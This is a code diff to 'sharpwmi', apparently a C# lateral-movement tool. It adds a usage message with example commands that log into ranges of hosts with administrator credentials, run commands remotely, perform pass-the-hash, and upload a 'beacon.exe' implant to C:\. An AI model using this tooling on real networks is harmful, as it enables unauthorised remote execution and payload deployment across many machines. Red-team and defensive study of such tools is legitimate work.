@@ -161,7 +161,15 @@ namespace sharpwmi
         }
         static void Main(string[] args)
         {
-
+            if (args.Length < 3)
+            {
+                Console.WriteLine("" +
+                    "\n\t\tsharpwmi.exe login 192.168.2.3/24 administrator 123 cmd whoami\n\t\t" +
+                    "sharpwmi.exe login 192.168.2.3-23 administrator 123 upload beacon.exe c:\\beacon.exe\n\t\t" +
+                    "sharpwmi.exe pth 192.168.2.3-192.168.2.77 cmd whoami\n\t\t" +
+                    "sharpwmi.exe pth 192.168.2.3/255.255.255.0 upload beacon.exe c:\\beacon.exe\n\t\t");
+                return;
+            }
             string method;
             string host;
             string username = "";
